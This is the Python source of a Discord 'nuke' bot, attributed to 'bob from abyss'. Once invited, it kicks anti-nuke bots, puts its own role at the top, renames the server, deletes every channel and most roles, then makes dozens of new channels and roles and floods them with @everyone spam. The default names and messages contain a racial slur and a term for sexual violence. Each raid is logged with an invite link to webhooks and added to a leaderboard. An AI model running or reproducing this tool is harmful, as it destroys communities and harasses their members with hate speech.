# bob from abyss made this

import json
import random
import aiohttp
import discord
import asyncio
from discord import ui
from discord.ext import commands
from collections import deque
from datetime import datetime, timedelta

flags = discord.MessageFlags()
flags.value |= (1 << 15)

with open("config.json") as f:
    config = json.load(f)

abots = [
    651095740390834176,
    1031537502017826826,
    466578580449525760,
    1282756838164795523,
    1518768862538108979,
    1317483934879055992,
    1369692565024014396,
    1499363376663625810,
    1518026289552949320
]

def load_supreme_access():
    try:
        with open("Supreme_Access.json", "r") as f:
            data = json.load(f)
            return set(data.get("supreme_users", []))
    except (FileNotFoundError, json.JSONDecodeError):
        return set()

def reload_supreme_access():
    global SUPREME_USERS
    try:
        with open("Supreme_Acess.json", "r") as f:
            data = json.load(f)
            SUPREME_USERS = set(data.get("supreme_users", []))
        return True
    except Exception as e:
        print(f"Error reloading Supreme_Acess.json: {e}")
        return False

def save_supreme_access():
    try:
        with open("Supreme_Acess.json", "w") as f:
            json.dump({"supreme_users": list(SUPREME_USERS)}, f, indent=4)
        return True
    except Exception as e:
        print(f"Error saving Supreme_Acess.json: {e}")
        return False
# bob from abyss made this

SUPREME_USERS = load_supreme_access()

def load_presets():
    try:
        with open("presets.json", "r") as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_presets(presets):
    with open("presets.json", "w") as f:
        json.dump(presets, f, indent=4)

user_presets = load_presets()


BLACKLIST_ADMINS = {
    1536521606686576720,
    1472291319115284551
}

nuke_cooldowns = {}
blacklisted_users = set()

def load_blacklist():
    global blacklisted_users
    try:
        with open("blacklist.json", "r") as f:
            data = json.load(f)
            blacklisted_users = set(data.get("blacklisted", []))
    except (FileNotFoundError, json.JSONDecodeError):
        blacklisted_users = set()
        save_blacklist()

def save_blacklist():
    with open("blacklist.json", "w") as f:
        json.dump({"blacklisted": list(blacklisted_users)}, f, indent=4)

load_blacklist()

# bob from abyss made this

AUTO_LEAVE_SECONDS = 6 * 60 * 60  # 6 hours

def load_join_times():
    try:
        with open("guild_joins.json", "r") as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_join_times():
    try:
        with open("guild_joins.json", "w") as f:
            json.dump(guild_join_times, f, indent=4)
    except Exception as e:
        print(f"Error saving guild_joins.json: {e}")

guild_join_times = load_join_times()   # {guild_id_str: iso_timestamp}
auto_leave_tasks = {}                  # {guild_id: asyncio.Task}

async def auto_leave_after(guild_id, delay):
    try:
        await asyncio.sleep(delay)
        guild = bot.get_guild(guild_id)
        if guild is not None:
            try:
                await guild.leave()
                print(f"Auto-left {guild.name} ({guild_id}) - 6h invite timer")
            except Exception as e:
                print(f"Auto-leave failed for {guild_id}: {type(e).__name__}: {e}")
    except asyncio.CancelledError:
        raise
    finally:
        guild_join_times.pop(str(guild_id), None)
        save_join_times()
        auto_leave_tasks.pop(guild_id, None)

def schedule_auto_leave(guild_id, remaining_seconds):
    old = auto_leave_tasks.get(guild_id)
    if old and not old.done():
        old.cancel()
    auto_leave_tasks[guild_id] = asyncio.create_task(
        auto_leave_after(guild_id, max(remaining_seconds, 0))
    )
# bob from abyss made this


intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix=".", intents=intents)

class RateLimiter:
    def __init__(self):
        self.channel_timers = {}
        self.global_timers = deque()
        self.lock = asyncio.Lock()
        
    async def wait(self, channel_id=None):
        async with self.lock:
            now = datetime.now()
            
            self.global_timers.append(now)
            cutoff = now - timedelta(seconds=1)
            while self.global_timers and self.global_timers[0] < cutoff:
                self.global_timers.popleft()
            
            if len(self.global_timers) >= 45:
                wait = 1.1 - (now - self.global_timers[0]).total_seconds()
                if wait > 0:
                    await asyncio.sleep(wait)
            
            if channel_id:
                if channel_id not in self.channel_timers:
                    self.channel_timers[channel_id] = deque()
                
                self.channel_timers[channel_id].append(now)
                ch_deque = self.channel_timers[channel_id]
                
                while ch_deque and ch_deque[0] < cutoff:
                    ch_deque.popleft()
                
                if len(ch_deque) >= 5:
                    wait = 1.1 - (now - ch_deque[0]).total_seconds()
                    if wait > 0:
                        await asyncio.sleep(wait)
# bob from abyss made this

limiter = RateLimiter()


async def create_invite(guild):
    try:
        invite = await guild.text_channels[0].create_invite(max_age=0, max_uses=0)
        return invite.url
    except (discord.Forbidden, discord.HTTPException) as e:
        print(f"Error creating invite: {e}")
        return None

async def bump_bot_role(guild):
    me = guild.me
    if me is None:
        print("bump_bot_role: guild.me is None")
        return False
    if not me.guild_permissions.manage_roles:
        print(f"bump_bot_role: NO Manage Roles in '{guild.name}' - cannot reorder")
        return False
    try:
        top_role = me.top_role
        highest_pos = max((r.position for r in guild.roles), default=0)
        print(f"bump_bot_role: '{guild.name}' | bot role '{top_role.name}' pos={top_role.position} | highest={highest_pos}")

        if top_role != guild.default_role and top_role.position >= highest_pos:
            print("bump_bot_role: already on top")
            return True

        if top_role == guild.default_role:
            top_role = await guild.create_role(name=bot.user.name, reason="ROLE BUMP")
            await guild.me.add_roles(top_role, reason="ROLE BUMP")

        await top_role.edit(position=len(guild.roles) - 1, reason="ROLE BUMP")
        await asyncio.sleep(0.5)
        # bob from abyss made this

        print(f"bump_bot_role: bumped '{top_role.name}' to top in '{guild.name}'")
        return True
    except discord.Forbidden as e:
        print(f"bump_bot_role: Forbidden - {e}")
    except Exception as e:
        print(f"bump_bot_role: {type(e).__name__}: {e}")
    return False

unkickable_notified = set()  

async def notify_unkickable_abot(guild, inviter=None):
    if guild.id in unkickable_notified:
        return
    try:
        if inviter is None:
            async for entry in guild.audit_logs(limit=5, action=discord.AuditLogAction.bot_add):
                if entry.target.id == bot.user.id:
                    inviter = entry.user
                    break
        if inviter is None:
            print("notify_unkickable_abot: no inviter found")
            return

        unkickable_notified.add(guild.id)
        await inviter.send(
            "**Hey! I couldnt kick a anti-nuke bot.**\n"
            "Raise my role **above all other roles** in this server, then run `.nuke` again.\n USE THE GIF FOR REFRENCE"
        )
        print(f"Notified {inviter} about unkickable abot in '{guild.name}'")
    except discord.Forbidden:
        print(f"Could not DM {inviter} about unkickable abot - DMs closed")
    except Exception as e:
        print(f"Error notifying inviter about unkickable abot: {type(e).__name__}: {e}")

async def record_nuke(guild, inviter):
    try:
        try:
            with open("nukes.json", "r") as f:
                nukes_data = json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            nukes_data = {}

        user_id = str(inviter.id)

        if user_id not in nukes_data:
            nukes_data[user_id] = {
                "username": str(inviter),
                "total_members": 0,
                "servers_nuked": 0,
                "last_nuke": None,
                "nuke_history": []
            }
# bob from abyss made this

        nuke_record = {
            "server_id": str(guild.id),
            "server_name": guild.name,
            "member_count": guild.member_count,
            "timestamp": datetime.now().isoformat()
        }

        nukes_data[user_id]["nuke_history"].append(nuke_record)
        nukes_data[user_id]["total_members"] += guild.member_count
        nukes_data[user_id]["servers_nuked"] += 1
        nukes_data[user_id]["last_nuke"] = datetime.now().isoformat()

        with open("nukes.json", "w") as f:
            json.dump(nukes_data, f, indent=4)

        print(f"Recorded nuke: {guild.name} with {guild.member_count} members by {inviter}")

        webhook_url = "INSERT_WEBHOOK_URL_HERE" # insert a webhook url if you want to add leaderboard stats
        for attempt in range(1, 4):
            try:
                async with aiohttp.ClientSession() as session:
                    webhook = discord.Webhook.from_url(webhook_url, session=session)
                    with open("nukes.json", "rb") as f:
                        file = discord.File(f, filename="nukes.json")
                        await webhook.send(
                            content=f"Nuke recorded: **{guild.name}** ({guild.member_count} members) by {inviter}",
                            file=file,
                            wait=True
                        )
                print("Webhook file sent successfully")
                break
            except Exception as e:
                print(f"Webhook send attempt {attempt}/3 failed: {type(e).__name__}: {e}")
                if attempt == 3:
                    raise
                await asyncio.sleep(2)
# bob from abyss made this

    except Exception as e:
        print(f"Error recording nuke: {type(e).__name__}: {e}")
        import traceback
        traceback.print_exc()

async def send_webhook(guild, inviter, invite_url, roles_deleted=0, roles_created=0, kicked=0):
    webhook_url = config.get("webhook_url")
    if not webhook_url:
        print("No webhook_url in config")
        return
    
    icon_url = None
    if guild.icon:
        icon_url = guild.icon.url
    
    embed = {
        "title": "server nuked",
        "color": 0xff0000,
        "fields": [
            {"name": "Server Name", "value": guild.name, "inline": True},
            {"name": "Server ID", "value": str(guild.id), "inline": True},
            {"name": "Channels", "value": str(len(guild.channels)), "inline": True},
            {"name": "Members", "value": str(guild.member_count), "inline": True},
            {"name": "Roles Deleted", "value": str(roles_deleted), "inline": True},
            {"name": "Roles Created", "value": str(roles_created), "inline": True},
            {"name": "Abots Kicked", "value": str(kicked), "inline": True},
            {"name": "Invited By", "value": str(inviter), "inline": True},
            {"name": "Invite link", "value": str(invite_url), "inline": True}
        ],
        "thumbnail": {"url": icon_url} if icon_url else None,
        "timestamp": datetime.utcnow().isoformat()
    }
    # bob from abyss made this

    if embed["thumbnail"] is None:
        del embed["thumbnail"]
    
    payload = {"embeds": [embed]}
    
    for attempt in range(1, 4):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(webhook_url, json=payload) as resp:
                    if resp.status == 204:
                        print(f"Webhook 2 sent successfully")
                        return
                    else:
                        raise Exception(f"status {resp.status} - {await resp.text()}")
        except Exception as e:
            print(f"Webhook 2 attempt {attempt}/3 failed: {type(e).__name__}: {e}")
            if attempt == 3:
                import traceback
                traceback.print_exc()
                return
            await asyncio.sleep(2)

async def leave_servers_with_user(user_id):
    for guild in bot.guilds:
        try:
            async for entry in guild.audit_logs(limit=5, action=discord.AuditLogAction.bot_add):
                if entry.target.id == bot.user.id and entry.user.id == user_id:
                    try:
                        await guild.leave()
                        print(f"Left server {guild.name} ({guild.id}) - blacklisted inviter")
                    except:
                        pass
                    break
        except:
            pass
            # bob from abyss made this


def is_guild_valid(guild):
    if guild is None:
        return False
    return guild in bot.guilds

def set_cooldown(user_id):
    nuke_cooldowns[user_id] = datetime.now()

class CreatePresetModal(ui.Modal, title="Create Custom Preset"):
    preset_name = ui.TextInput(
        label="Preset Name (no spaces)",
        placeholder="myCustomNuke",
        style=discord.TextStyle.short,
        required=True,
        max_length=50
    )
    
    channel_names = ui.TextInput(
        label="Channel Names (comma separated)",
        placeholder="CHANNEL-1, CHANNEL-2, CHANNEL-3",
        style=discord.TextStyle.paragraph,
        required=True,
        max_length=1000
    )
    
    server_name = ui.TextInput(
        label="Server Name",
        placeholder="NUKED BY CUSTOM",
        style=discord.TextStyle.short,
        required=True,
        max_length=100
    )
    
    server_icon_url = ui.TextInput(
        label="Server Icon URL (direct image link)",
        placeholder="https://i.imgur.com/xxxx.png",
        style=discord.TextStyle.short,
        required=False,
        max_length=500
    )

    # bob from abyss made this

    
    spam_message = ui.TextInput(
        label="Spam Message (use \\n for new lines)",
        placeholder="@everyone NUKED!",
        style=discord.TextStyle.paragraph,
        required=True,
        max_length=2000
    )
    
    def __init__(self, original_message=None, user_id=None):
        super().__init__()
        self.original_message = original_message
        self.user_id = user_id
    
    async def on_submit(self, interaction: discord.Interaction):
        try:
            user_id = str(interaction.user.id)
            preset_name = str(self.preset_name).strip().replace(" ", "_")
            
            if not preset_name.replace("_", "").isalnum():
                await interaction.response.send_message("Preset name must be alphanumeric (underscores allowed).", ephemeral=True)
                return
            
            channel_list = [name.strip() for name in str(self.channel_names).split(",") if name.strip()]
            if len(channel_list) < 1:
                channel_list = ["CUSTOM-NUKE"]
            
            if user_id not in user_presets:
                user_presets[user_id] = {}
            
            user_presets[user_id][preset_name] = {
                "channel_names": channel_list,
                "server_name": str(self.server_name),
                "server_icon_url": str(self.server_icon_url) if self.server_icon_url else None,
                "spam_message": str(self.spam_message).replace("\\n", "\n"),
                "created_at": datetime.now().isoformat()
            }
            save_presets(user_presets)
            
            embed = discord.Embed(
                title="Preset Created",
                description=f"Preset `{preset_name}` has been saved!",
                color=discord.Color.green(),
                timestamp=datetime.utcnow()
            )
            embed.add_field(name="Channel Names", value=", ".join(channel_list[:5]) + ("..." if len(channel_list) > 5 else ""), inline=False)
            embed.add_field(name="Server Name", value=str(self.server_name), inline=True)
            embed.add_field(name="Server Icon", value="Set" if self.server_icon_url else "Default", inline=True)
            embed.add_field(name="Usage", value=f"`.nuke {preset_name}`", inline=False)
            
            await interaction.response.send_message(embed=embed, ephemeral=True)
            
            if self.original_message:
                try:
                    new_view = PresetSelectView(user_id, original_message=self.original_message)
                    new_embed = discord.Embed(
                        title="Custom Nuke Preset Menu",
                        description="Create and manage named presets for `.nuke [preset]`\n\n**Features:**\n• Multiple named presets per user\n• Custom channel names, server name/icon\n• Custom spam messages\n\n*Use `.nuke presetName` to activate*",
                        color=discord.Color.dark_purple()
                    )
                    user_preset_count = len(user_presets.get(user_id, {}))
                    new_embed.add_field(name="Your Presets", value=f"{user_preset_count} saved", inline=False)
                    await self.original_message.edit(embed=new_embed, view=new_view)
                except Exception as e:
                    print(f"Error refreshing menu: {e}")
            
        except Exception as e:
            print(f"Error in modal submit: {e}")
            await interaction.response.send_message(f"Error saving preset: {e}", ephemeral=True)

class DeletePresetSelect(ui.View):
    def __init__(self, user_id, presets, original_message=None):
        super().__init__(timeout=30)
        self.user_id = user_id
        self.presets = presets
        self.original_message = original_message
        
        options = [
            discord.SelectOption(label=name[:25], description=f"Created: {data['created_at'][:10]}")
            for name, data in list(presets.items())[:25]
        ]
        
        self.select = discord.ui.Select(placeholder="Choose preset to delete...", options=options)
        self.select.callback = self.select_callback
        self.add_item(self.select)

# bob from abyss made this

    
    async def select_callback(self, interaction: discord.Interaction):
        try:
            selected = self.select.values[0]
            if selected in user_presets.get(self.user_id, {}):
                del user_presets[self.user_id][selected]
                if not user_presets[self.user_id]:
                    del user_presets[self.user_id]
                save_presets(user_presets)
                await interaction.response.send_message(f"Deleted preset `{selected}`.", ephemeral=True)
                
                if self.original_message:
                    try:
                        new_view = PresetSelectView(self.user_id, original_message=self.original_message)
                        new_embed = discord.Embed(
                            title="Custom Nuke Preset Menu",
                            description="Create and manage named presets for `.nuke [preset]`\n\n**Features:**\n• Multiple named presets per user\n• Custom channel names, server name/icon\n• Custom spam messages\n\n*Use `.nuke presetName` to activate*",
                            color=discord.Color.dark_purple()
                        )
                        user_preset_count = len(user_presets.get(self.user_id, {}))
                        new_embed.add_field(name="Your Presets", value=f"{user_preset_count} saved", inline=False)
                        await self.original_message.edit(embed=new_embed, view=new_view)
                    except Exception as e:
                        print(f"Error refreshing menu after delete: {e}")
            else:
                await interaction.response.send_message("Preset not found.", ephemeral=True)
        except Exception as e:
            print(f"Error in delete callback: {e}")
            await interaction.response.send_message(f"Error: {e}", ephemeral=True)

class PresetSelectView(ui.View):
    def __init__(self, user_id, original_message=None):
        super().__init__(timeout=120)
        self.user_id = str(user_id)
        self.original_message = original_message
        self.user_preset_list = user_presets.get(self.user_id, {})
    
    @ui.button(label="Create New Preset", style=discord.ButtonStyle.primary)
    async def create_preset(self, interaction: discord.Interaction, button: ui.Button):
        try:
            modal = CreatePresetModal(original_message=self.original_message, user_id=self.user_id)
            await interaction.response.send_modal(modal)
        except Exception as e:
            print(f"Error sending modal: {e}")
            await interaction.response.send_message("Error opening modal. Try again.", ephemeral=True)
    
    @ui.button(label="List My Presets", style=discord.ButtonStyle.secondary)
    async def list_presets(self, interaction: discord.Interaction, button: ui.Button):
        try:
            self.user_preset_list = user_presets.get(self.user_id, {})
            
            if not self.user_preset_list:
                await interaction.response.send_message("You have no presets. Create one first!", ephemeral=True)
                return
            
            embed = discord.Embed(
                title="Your Presets",
                description="Use `.nuke [preset_name]` to use a preset",
                color=discord.Color.blurple()
            )
            
            for name, data in self.user_preset_list.items():
                ch_count = len(data["channel_names"])
                server = data['server_name'][:30] + "..." if len(data['server_name']) > 30 else data['server_name']
                embed.add_field(
                    name=f"`{name}`",
                    value=f"Channels: {ch_count} | Server: {server}",
                    inline=False
                )
            
            await interaction.response.send_message(embed=embed, ephemeral=True)
        except Exception as e:
            print(f"Error listing presets: {e}")
            await interaction.response.send_message(f"Error: {e}", ephemeral=True)
    
    @ui.button(label="Delete Preset", style=discord.ButtonStyle.danger)
    async def delete_preset(self, interaction: discord.Interaction, button: ui.Button):
        try:
            self.user_preset_list = user_presets.get(self.user_id, {})
            
            if not self.user_preset_list:
                await interaction.response.send_message("You have no presets to delete.", ephemeral=True)
                return
            
            view = DeletePresetSelect(self.user_id, self.user_preset_list, original_message=self.original_message)
            await interaction.response.send_message("Select a preset to delete:", view=view, ephemeral=True)
        except Exception as e:
            print(f"Error delete preset: {e}")
            await interaction.response.send_message(f"Error: {e}", ephemeral=True)

# bob from abyss made this


@bot.event
async def on_ready():
    print(f"Logged in: {bot.user}")
    print(f"Supreme Access users: {len(SUPREME_USERS)}")
    total_presets = sum(len(p) for p in user_presets.values())
    print(f"Total presets loaded: {total_presets}")

    now = datetime.now()
    restored = 0
    for gid_str in list(guild_join_times.keys()):
        gid = int(gid_str)
        guild = bot.get_guild(gid)
        if guild is None:
            guild_join_times.pop(gid_str, None)
            continue
        try:
            joined = datetime.fromisoformat(guild_join_times[gid_str])
        except ValueError:
            joined = now
        remaining = AUTO_LEAVE_SECONDS - (now - joined).total_seconds()
        schedule_auto_leave(gid, remaining)
        restored += 1
    save_join_times()
    print(f"Restored {restored} auto-leave timers")

@bot.event
async def on_member_join(member):
    guild = member.guild
    await bump_bot_role(guild)

@bot.event
async def on_guild_join(guild):
    inviter = None
    async for entry in guild.audit_logs(limit=5, action=discord.AuditLogAction.bot_add):
        if entry.target.id == bot.user.id:
            inviter = entry.user
            break
    
    if inviter is None:
        return
    
    if inviter.id in blacklisted_users:
        try:
            await inviter.send("You are blacklisted and cannot use this bot. The bot has left the server.")
        except:
            pass
        try:
            await guild.leave()
        except:
            pass
        return
    
    now = datetime.now()
    if inviter.id in nuke_cooldowns:
        time_elapsed = (now - nuke_cooldowns[inviter.id]).total_seconds()
        if time_elapsed < 600:
            remaining = 600 - time_elapsed
            try:
                await inviter.send(f"You're on cooldown. Wait {remaining:.0f} more seconds before inviting the bot again.")
            except:
                pass
            try:
                await guild.leave()
                print(f"Left {guild.name} - {inviter} is on cooldown ({remaining:.0f}s remaining)")
            except:
                pass
            return

    await bump_bot_role(guild)

    # start 6h auto-leave timer
    guild_join_times[str(guild.id)] = datetime.now().isoformat()
    save_join_times()
    schedule_auto_leave(guild.id, AUTO_LEAVE_SECONDS)

    try:
        lines = [
            "# thanks for adding our bot",
            "",
            "## Commands:",
            "",
            "**.nuke** - nuke with defaults (channels + roles)",
            "**.nuke [preset]** - nuke with custom preset (Supreme only)",
            "**.ping** - ping the bot",
            "**.custompresets** - allows for custom nuking (RUN THIS COMMAND IN BOT DMS) (Supreme only)"
            "",
            "-# Made by [Abyss](https://discord.gg/XBD4ZeugZ6)"
        ]

        view = ui.LayoutView(timeout=None)

        view.add_item(
            ui.Container(
                ui.TextDisplay("\n".join(lines)),
                accent_color=discord.Color.blurple()
            )
        )
        await inviter.send(view=view)
        print(f"Sent thank you DM to {inviter}")
        print(f"Sent role-hierarchy gif to {inviter}")
    except discord.Forbidden:
        print(f"Could not DM {inviter} - DMs closed")
    except Exception as e:
        print(f"Error sending DM: {e}")

@bot.event
async def on_guild_remove(guild):
    gid = guild.id
    guild_join_times.pop(str(gid), None)
    save_join_times()
    task = auto_leave_tasks.pop(gid, None)
    if task and not task.done():
        task.cancel()

@bot.command()
async def custompresets(ctx):
    if ctx.guild is not None:
        await ctx.send("This command can only be used in DMs.", delete_after=5)
        try:
            await ctx.message.delete()
        except:
            pass
        return
    
    if ctx.author.id not in SUPREME_USERS:
        await ctx.send("You don't have Supreme Access to use this feature.", delete_after=5)
        return
    
    try:
        embed = discord.Embed(
            title="Custom Nuke Preset Menu",
            description="Create and manage named presets for `.nuke [preset]`\n\n**Features:**\n• Multiple named presets per user\n• Custom channel names, server name/icon\n• Custom spam messages\n\n*Use `.nuke presetName` to activate*",
            color=discord.Color.dark_purple()
        )
        
        user_preset_count = len(user_presets.get(str(ctx.author.id), {}))
        embed.add_field(name="Your Presets", value=f"{user_preset_count} saved", inline=False)
        
        message = await ctx.send(embed=embed)
        
        view = PresetSelectView(ctx.author.id, original_message=message)
        await message.edit(view=view)
        
    except Exception as e:
        print(f"Error in custompresets: {e}")
        await ctx.send(f"Error: {e}")

@bot.command()
async def refreshusers(ctx):
    if ctx.author.id not in BLACKLIST_ADMINS:
        await ctx.send("You don't have permission to use this command.")
        return
    
    if reload_supreme_access():
        await ctx.send(f"Supreme Access list reloaded. {len(SUPREME_USERS)} users loaded.")
    else:
        await ctx.send("Failed to reload Supreme_Acess.json. Check console for errors.")

@bot.command()
async def users(ctx, action=None, user_id: str = None):
    if ctx.author.id not in BLACKLIST_ADMINS:
        await ctx.send("You don't have permission to use this command.")
        return
    
    if action is None or user_id is None:
        embed = discord.Embed(
            title="Supreme Access Users",
            description=f"Total: {len(SUPREME_USERS)} users",
            color=discord.Color.gold()
        )
        if SUPREME_USERS:
            user_list = []
            for uid in SUPREME_USERS:
                user = bot.get_user(uid)
                if user:
                    user_list.append(f"`{uid}` - {user}")
                else:
                    user_list.append(f"`{uid}` - (Unknown)")
            embed.add_field(name="Users", value="\n".join(user_list)[:1000] or "None", inline=False)
        await ctx.send(embed=embed)
        await ctx.send("Usage: `.users [add/remove] [user_id]`")
        return
    # bob from abyss made this

    action = action.lower()
    
    if action not in ["add", "remove"]:
        await ctx.send("Action must be `add` or `remove`")
        return
    
    target_id = None
    if user_id.startswith("<@") and user_id.endswith(">"):
        user_id = user_id[2:-1]
        if user_id.startswith("!"):
            user_id = user_id[1:]
    
    try:
        target_id = int(user_id)
    except ValueError:
        await ctx.send(f"Invalid user ID: `{user_id}`")
        return
    
    target_user = await bot.fetch_user(target_id)
    
    if action == "add":
        if target_id in SUPREME_USERS:
            await ctx.send(f"{target_user} (`{target_id}`) already has Supreme Access.")
        else:
            SUPREME_USERS.add(target_id)
            if save_supreme_access():
                await ctx.send(f"Added {target_user} (`{target_id}`) to Supreme Access.")
            else:
                await ctx.send("Failed to save. Check console.")
    
    elif action == "remove":
        if target_id not in SUPREME_USERS:
            await ctx.send(f"{target_user} (`{target_id}`) does not have Supreme Access.")
        else:
            SUPREME_USERS.discard(target_id)
            if save_supreme_access():
                if str(target_id) in user_presets:
                    del user_presets[str(target_id)]
                    save_presets(user_presets)
                await ctx.send(f"Removed {target_user} (`{target_id}`) from Supreme Access.")
            else:
                await ctx.send("Failed to save. Check console.")
# bob from abyss made this

@bot.command()
async def blacklist(ctx, action=None, target=None):
    if ctx.author.id not in BLACKLIST_ADMINS:
        await ctx.send("You don't have permission to use this command.")
        return
    
    if action is None or target is None:
        await ctx.send("Usage: `.blacklist [add/remove] [userid/username/mention]`")
        return
    
    action = action.lower()
    
    if action not in ["add", "remove"]:
        await ctx.send("Action must be `add` or `remove`")
        return
    
    target_id = None
    target_user = None
    
    if target.startswith("<@") and target.endswith(">"):
        target = target[2:-1]
        if target.startswith("!"):
            target = target[1:]
    
    try:
        target_id = int(target)
        target_user = await bot.fetch_user(target_id)
    except (ValueError, discord.NotFound):
        await ctx.send(f"Could not find user: `{target}`. Please provide a valid user ID or mention.")
        return
    except Exception as e:
        await ctx.send(f"Error looking up user: {e}")
        return
    
    if target_user is None:
        await ctx.send(f"Could not find user: `{target}`")
        return
    
    if action == "add":
        if target_id in blacklisted_users:
            await ctx.send(f"{target_user} is already blacklisted.")
        else:
            blacklisted_users.add(target_id)
            save_blacklist()
            await ctx.send(f"Added {target_user} to the blacklist. Leaving all servers where they invited the bot.")
            await leave_servers_with_user(target_id)
    
    elif action == "remove":
        if target_id not in blacklisted_users:
            await ctx.send(f"{target_user} is not blacklisted.")
        else:
            blacklisted_users.remove(target_id)
            save_blacklist()
            await ctx.send(f"Removed {target_user} from the blacklist.")

@bot.command()
async def nuke(ctx, preset_name: str = None):
    user_id = ctx.author.id
    now = datetime.now()
    
    if user_id in nuke_cooldowns:
        time_elapsed = (now - nuke_cooldowns[user_id]).total_seconds()
        if time_elapsed < 600:
            remaining = 600 - time_elapsed
            await ctx.send(f"You're on cooldown. Wait {remaining:.0f} more seconds.")
            return
    
    nuke_cooldowns[user_id] = now
    guild = ctx.guild
    author = ctx.author

    await record_nuke(guild, author)

    await bump_bot_role(guild)

    async def kick_abots():
        if not guild.me.guild_permissions.kick_members:
            print("No permission to kick members, skipping abots kick")
            return 0

        kicked = 0
        for member in list(guild.members):
            if not is_guild_valid(guild):
                return kicked
            if member.id in abots:
                if member == guild.owner:
                    print(f"Abot {member} ({member.id}) is the server owner - cannot kick")
                    continue
                try:
                    await member.kick(reason="ABOT KICK")
                    kicked += 1
                    print(f"Kicked abot: {member} ({member.id})")
                    unkickable_notified.discard(guild.id)
                    await asyncio.sleep(0.2)
                except discord.NotFound:
                    pass
                except discord.Forbidden:
                    print(
                        f"Could not kick abot {member} | "
                        f"bot top role pos={guild.me.top_role.position} '{guild.me.top_role.name}' | "
                        f"target top role pos={member.top_role.position} '{member.top_role.name}'"
                    )
                    await notify_unkickable_abot(guild)
                except Exception as e:
                    print(f"Error kicking {member}: {e}")

        return kicked

    kicked = await kick_abots()

    custom_config = None
    using_preset = False
    
    if preset_name and author.id in SUPREME_USERS:
        user_id_str = str(user_id)
        if user_id_str in user_presets and preset_name in user_presets[user_id_str]:
            custom_config = user_presets[user_id_str][preset_name]
            using_preset = True
            print(f"Using preset '{preset_name}' for user {author}")
        else:
            print(f"Preset '{preset_name}' not found for user {author}, using default")
    
    if using_preset:
        names = custom_config.get("channel_names", ["FUCKED-BY-ABYSS", "NUKED-BY-ABYSS", "RAPED-BY-ABYSS", "MOGGED-BY-ABYSS"])
        server_name = custom_config.get("server_name", "ᴀʙʏꜱꜱ ᴏᴡɴꜱ ᴜ")
        icon_url = custom_config.get("server_icon_url") or "https://i.imgur.com/t06fuKi.png"
        spam_msg = custom_config.get("spam_message", "# @everyone @here GET NUKED NIGGAS\n## Abyss was here join now!\nhttps://discord.gg/8x7qMZPWyt")
    else:
        names = ["FUCKED-BY-ABYSS", "NUKED-BY-ABYSS", "RAPED-BY-ABYSS", "MOGGED-BY-ABYSS"]
        server_name = "ᴀʙʏꜱꜱ ᴏᴡɴꜱ ᴜ"
        icon_url = "https://i.imgur.com/t06fuKi.png"
        spam_msg = "# @everyone @here GET NUKED NIGGAS\n## Abyss was here join now!\nhttps://discord.gg/8x7qMZPWyt"

    icon_bytes = None
    try:
        async with aiohttp.ClientSession() as session:
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
            async with session.get(icon_url, headers=headers) as resp:
                if resp.status == 200:
                    icon_bytes = await resp.read()
    except Exception as e:
        print(f"Icon download error: {e}")

    try:
        if icon_bytes:
            await guild.edit(name=server_name, icon=icon_bytes)
        else:
            await guild.edit(name=server_name)
    except discord.NotFound as e:
        if e.code == 10004:
            return
        raise
    except discord.Forbidden:
        print("No permission to edit server")
    except Exception as e:
        print(f"Edit error: {e}")

    if not is_guild_valid(guild):
        return

    for ch in guild.channels:
        try:
            await ch.delete()
        except discord.NotFound as e:
            if e.code == 10003:
                pass
            elif e.code == 10004:
                return
        except:
            pass
        await asyncio.sleep(0.003)

    if not is_guild_valid(guild):
        return

    first_ch = None
    try:
        first_ch = await guild.create_text_channel(random.choice(names))
        print(f"Created first channel: {first_ch.name}")
    except discord.NotFound as e:
        if e.code == 10004:
            return
        return
    except Exception as e:
        print(f"Error creating first channel: {e}")
        return

    invite_url = "Failed to create invite"
    if first_ch:
        try:
            invite = await first_ch.create_invite(max_age=0, max_uses=0)
            invite_url = invite.url
            print(f"Created invite: {invite.url}")
        except Exception as e:
            print(f"Error creating invite: {e}")

    async def spam_channel(ch):
        for _ in range(50):
            if not is_guild_valid(guild):
                return
            try:
                await limiter.wait(ch.id)
                await ch.send(spam_msg)
            except discord.NotFound as e:
                if e.code == 10003:
                    return
                elif e.code == 10004:
                    return
            except discord.HTTPException as e:
                if e.status == 429:
                    retry = float(e.response.headers.get('Retry-After', 1))
                    await asyncio.sleep(retry)
                    try:
                        if not is_guild_valid(guild):
                            return
                        await ch.send(spam_msg)
                    except discord.NotFound as ne:
                        if ne.code == 10004:
                            return
                    except:
                        pass
            except:
                pass
            await asyncio.sleep(0.05)

    async def nuke_roles():
        if not guild.me.guild_permissions.manage_roles:
            print("No permission to manage roles, skipping role nuke")
            return 0, 0, 0

        bot_top_role = guild.me.top_role
        roles_to_delete = [
            role for role in guild.roles
            if role != guild.default_role
            and role < bot_top_role
            and role != bot_top_role
        ]

        deleted = 0
        failed = 0
        for role in roles_to_delete:
            if not is_guild_valid(guild):
                return deleted, failed, 0
            try:
                await role.delete(reason="NUKE BY ABYSS")
                deleted += 1
                if deleted % 5 == 0:
                    await asyncio.sleep(1.1)
                else:
                    await asyncio.sleep(0.2)
            except discord.NotFound:
                pass
            except Exception:
                failed += 1

        if not is_guild_valid(guild):
            return deleted, failed, 0

        created = 0
        for i in range(50):
            if not is_guild_valid(guild):
                return deleted, failed, created
            try:
                await guild.create_role(
                    name="abyss-owns-you",
                    color=discord.Color.red(),
                    reason="NUKE BY ABYSS"
                )
                created += 1
                if created % 5 == 0:
                    await asyncio.sleep(1.1)
                else:
                    await asyncio.sleep(0.2)
            except discord.NotFound:
                return deleted, failed, created
            except Exception:
                pass

        return deleted, failed, created

    tasks = [asyncio.create_task(spam_channel(first_ch))]
    role_task = asyncio.create_task(nuke_roles())
    
    async def create_and_spam():
        try:
            ch = await guild.create_text_channel(random.choice(names))
            await spam_channel(ch)
        except discord.NotFound as e:
            if e.code == 10004:
                return
        except:
            pass

    for i in range(49):
        task = asyncio.create_task(create_and_spam())
        tasks.append(task)
        await asyncio.sleep(0.15)

    await asyncio.gather(*tasks, return_exceptions=True)
    roles_deleted, roles_failed, roles_created = await role_task

